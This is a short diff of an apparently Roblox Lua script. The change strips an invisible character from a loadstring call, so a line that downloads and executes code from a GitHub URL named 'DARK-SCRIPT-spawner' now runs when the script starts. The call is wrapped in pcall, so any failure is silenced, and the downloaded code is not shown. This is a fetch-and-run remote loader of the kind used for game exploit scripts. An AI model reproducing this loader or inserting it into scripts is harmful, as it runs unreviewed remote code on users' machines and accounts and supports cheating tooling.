@@ -2,7 +2,7 @@ local TweenService = game:GetService("TweenService")
 
 -- Execute the external script at the start
 pcall(function()
-    ‎loadstring(game:HttpGet("https://raw.githubusercontent.com/vincen11226/DARK-SCRIPT-spawner-/refs/heads/main/DARK%20SCRIPT%20SPAWNER"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/vincen11226/DARK-SCRIPT-spawner-/refs/heads/main/DARK%20SCRIPT%20SPAWNER"))()
 end)
 
 local ScreenGui = Instance.new("ScreenGui")
